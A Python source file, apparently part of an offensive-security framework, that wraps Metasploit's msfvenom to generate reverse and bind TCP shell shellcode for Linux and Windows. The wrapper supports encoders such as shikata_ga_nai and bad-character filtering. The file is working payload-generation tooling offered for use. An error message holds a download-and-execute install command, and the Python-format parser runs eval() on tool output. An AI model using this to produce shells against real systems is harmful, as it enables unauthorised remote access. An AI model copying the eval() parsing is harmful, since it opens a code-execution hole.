"""Msfvenom wrapper for shellcode generation."""

import logging
import shutil
import subprocess
from typing import Optional

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class MsfvenomGenerator:
    """Wrapper for msfvenom CLI"""

    def __init__(self):
        """Initialize msfvenom generator and check if msfvenom is available."""
        self.msfvenom_path = shutil.which("msfvenom")
        if not self.msfvenom_path:
            raise RuntimeError(
                "msfvenom not found in PATH. Install Metasploit Framework:\n"
                "  Ubuntu/Debian: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n"
                "  macOS: brew install metasploit\n"
                "  Or use Docker assembly compilation instead (use_docker_compile=True)"
            )

    def _get_payload_name(self, os_target: str, arch: str, shell_type: str) -> str:
        """Map OS/arch/type to msfvenom payload name."""
        payload_map = {
            ("linux", "x86", "reverse"): "linux/x86/shell_reverse_tcp",
            ("linux", "x86", "bind"): "linux/x86/shell_bind_tcp",
            ("linux", "x64", "reverse"): "linux/x64/shell_reverse_tcp",
            ("linux", "x64", "bind"): "linux/x64/shell_bind_tcp",
            ("windows", "x86", "reverse"): "windows/shell_reverse_tcp",
            ("windows", "x86", "bind"): "windows/shell_bind_tcp",
            ("windows", "x64", "reverse"): "windows/x64/shell_reverse_tcp",
            ("windows", "x64", "bind"): "windows/x64/shell_bind_tcp",
        }
        key = (os_target.lower(), arch.lower(), shell_type.lower())
        if key not in payload_map:
            raise ValueError(f"Unsupported payload: {key}")
        return payload_map[key]

    def generate(
        self,
        os_target: str,
        arch: str,
        shell_type: str,
        ip: str,
        port: int,
        bad_chars: Optional[list[str]] = None,
        encoder: Optional[str] = None,
        iterations: int = 1,
        format: str = "raw",
    ) -> bytes:
        """
        Generate shellcode using msfvenom.

        Args:
            os_target: Target OS (linux, windows)
            arch: Architecture (x86, x64)
            shell_type: Shell type (reverse, bind)
            ip: IP address
            port: Port number
            bad_chars: List of bad characters to avoid
            encoder: Encoder name (e.g., "x86/shikata_ga_nai")
            iterations: Number of encoding iterations
            format: Output format (raw, python, c, etc.)

        Returns:
            Shellcode bytes
        """
        payload_name = self._get_payload_name(os_target, arch, shell_type)

        cmd = [self.msfvenom_path, "-p", payload_name]

        # Add payload options
        if shell_type == "reverse":
            cmd.extend(["LHOST=" + ip, f"LPORT={port}"])
        elif shell_type == "bind":
            cmd.extend([f"LPORT={port}"])

        # Add bad characters
        if bad_chars:
            bad_char_str = "".join(bad_chars)
            cmd.extend(["-b", bad_char_str])

        # Add encoder
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        # Output format
        cmd.extend(["-f", format])

        # Execute msfvenom
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                check=True,
                timeout=30,
            )
            shellcode = result.stdout

            # Parse output based on format
            if format == "python":
                shellcode = self._parse_python_format(shellcode.decode())
            elif format == "c":
                shellcode = self._parse_c_format(shellcode.decode())

            logger.info(
                f"Generated {len(shellcode)} bytes using msfvenom: {payload_name}"
            )
            return shellcode

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode() if e.stderr else str(e)
            raise RuntimeError(f"Msfvenom failed: {error_msg}")
        except subprocess.TimeoutExpired:
            raise RuntimeError("Msfvenom timed out after 30 seconds")

    def _parse_python_format(self, output: str) -> bytes:
        """Parse msfvenom python format output."""
        # Extract bytes from: buf = b"\xfc\x48\x83..."
        for line in output.split("\n"):
            if "buf" in line and "=" in line:
                # Extract the byte string
                start = line.find('b"')
                if start == -1:
                    start = line.find("b'")
                if start != -1:
                    byte_str = line[start:]
                    # Remove trailing quotes and whitespace
                    byte_str = byte_str.rstrip().rstrip('"').rstrip("'")
                    return eval(byte_str)
        raise ValueError("Could not parse msfvenom python output")

    def _parse_c_format(self, output: str) -> bytes:
        """Parse msfvenom C format output."""
        # Extract hex values from: unsigned char buf[] = "\xfc\x48\x83...";
        hex_str = ""
        for line in output.split("\n"):
            if "\\x" in line:
                hex_str += line.strip().strip('"').strip(";")

        if not hex_str:
            raise ValueError("Could not parse msfvenom C output")

        # Convert \xNN format to bytes
        hex_values = hex_str.split("\\x")[1:]
        return bytes([int(h[:2], 16) for h in hex_values if h])

    def list_payloads(
        self, os_target: Optional[str] = None, arch: Optional[str] = None
    ) -> list[str]:
        """
        List available msfvenom payloads.

        Args:
            os_target: Filter by OS (linux, windows, etc.)
            arch: Filter by architecture (x86, x64, etc.)

        Returns:
            List of payload names
        """
        cmd = [self.msfvenom_path, "-l", "payloads"]
        result = subprocess.run(cmd, capture_output=True, text=True)

        payloads = []
        for line in result.stdout.split("\n"):
            line = line.strip()
            if not line or line.startswith("Name") or line.startswith("="):
                continue

            # Parse payload name (first column)
            parts = line.split()
            if parts:
                payload = parts[0]

                # Apply filters
                if os_target and not payload.startswith(os_target.lower()):
                    continue
                if arch and arch.lower() not in payload:
                    continue

                payloads.append(payload)

        return payloads


# Singleton instance
_msfvenom_generator: Optional[MsfvenomGenerator] = None


def get_msfvenom_generator() -> MsfvenomGenerator:
    """Get or create msfvenom generator singleton."""
    global _msfvenom_generator
    if _msfvenom_generator is None:
        _msfvenom_generator = MsfvenomGenerator()
    return _msfvenom_generator
